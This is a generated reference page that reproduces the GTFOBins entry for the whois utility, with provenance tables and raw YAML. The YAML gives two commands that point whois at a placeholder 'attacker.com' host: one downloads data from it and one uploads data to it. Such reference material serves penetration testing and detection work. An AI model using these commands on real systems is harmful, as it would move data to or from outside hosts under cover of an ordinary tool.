---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# whois

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `whois` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/whois` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [whois](../../tools/linux/whois.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | whois |
| name | whois |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/whois/ |

## Preserved Source Material

```yaml
_body: ''
_name: whois
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/whois
functions:
  download:
  - code: whois -h attacker.com -p 12345 x
    comment: Received data has instances of the `\r` byte stripped.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    sender: tcp-server
  upload:
  - binary: false
    code: whois -h attacker.com -p 12345 DATA
    comment: Data is converted to lower case, and has a trailing `\r\n`.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver: tcp-server
```
